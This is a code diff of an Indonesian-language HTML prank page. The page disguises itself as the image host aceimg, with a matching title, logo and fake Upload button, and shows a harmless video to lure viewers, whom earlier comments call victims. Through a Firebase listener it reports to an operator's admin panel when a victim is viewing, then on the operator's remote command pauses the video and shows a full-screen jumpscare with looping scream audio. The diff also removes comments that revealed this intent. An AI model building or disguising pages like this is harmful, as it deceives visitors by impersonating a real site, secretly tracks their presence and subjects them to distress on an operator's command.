@@ -3,26 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Viral Terbaru 2026</title>
+    <title>aceimg.com/upload</title>
     <style>
         body {
-            background-color: #0b0b0b;
-            color: #ffffff;
+            background-color: #ffffff;
+            color: #111111;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             margin: 0;
             padding: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
             min-height: 100vh;
         }
+        /* Header Navbar ala aceimg */
+        .navbar {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 16px;
+            box-sizing: border-box;
+            background: #ffffff;
+        }
+        .logo {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #111;
+        }
+        .btn-upload {
+            background-color: #111827;
+            color: white;
+            border: none;
+            padding: 8px 18px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 20px;
+            cursor: pointer;
+        }
+
+        /* Container Video Utama */
         .video-container {
             position: relative;
             width: 100%;
             max-width: 480px;
             background: #000;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
             overflow: hidden;
         }
         video {
@@ -30,17 +57,16 @@
             display: block;
             aspect-ratio: 9 / 16;
             object-fit: cover;
+            background: #000;
         }
-        .title-text {
-            padding: 15px;
-            font-size: 15px;
-            font-weight: 500;
+
+        /* Teks Footer di bawah video */
+        .footer-text {
+            padding: 20px 16px;
+            font-size: 14px;
+            color: #1d4ed8;
             text-align: center;
-            color: #e0e0e0;
-            background: #161616;
-            width: 100%;
-            max-width: 480px;
-            box-sizing: border-box;
+            font-weight: 500;
         }
 
         /* Overlay Jumpscare */
@@ -66,14 +92,22 @@
 </head>
 <body>
 
+    <!-- Navbar Atas -->
+    <div class="navbar">
+        <div class="logo">aceimg</div>
+        <button class="btn-upload" onclick="alert('Fitur upload sedang sibuk!')">Upload</button>
+    </div>
+
+    <!-- Pemutar Video -->
     <div class="video-container">
-        <!-- Pemutar video asli supaya korban tidak curiga -->
         <video id="victimVideo" controls playsinline preload="auto">
             <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
             Browser Anda tidak mendukung pemutar video.
         </video>
     </div>
-    <div class="title-text">Kamu pasti ingin lihat ini 🤣</div>
+
+    <!-- Teks Bawah -->
+    <div class="footer-text">Kamu pasti ingin lihat ini</div>
 
     <!-- Elemen Jumpscare -->
     <div id="jumpscare-overlay">
@@ -81,7 +115,7 @@
         <audio id="js-audio" src="./screamer.mp3" preload="auto" loop></audio>
     </div>
 
-    <!-- Script Firebase Listener untuk Halaman Video -->
+    <!-- Script Firebase Listener -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
         import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-database.js";
@@ -99,7 +133,7 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // Kirim status online agar panel admin mendeteksi korban sedang membuka video
+        // Kirim status online ke panel admin
         const statusRef = ref(db, 'target_status');
         setInterval(() => {
             set(statusRef, { lastSeen: Date.now() });
@@ -116,10 +150,7 @@
             const video = document.getElementById('victimVideo');
 
             if (data.action === 'play' || data.action === 'jumpscare') {
-                // Jeda video aslinya kalau sedang diputar
                 video.pause();
-
-                // Tampilkan jumpscare dan putar suara
                 overlay.style.display = 'flex';
                 audio.play().catch(e => console.log("Audio diblokir browser:", e));
 
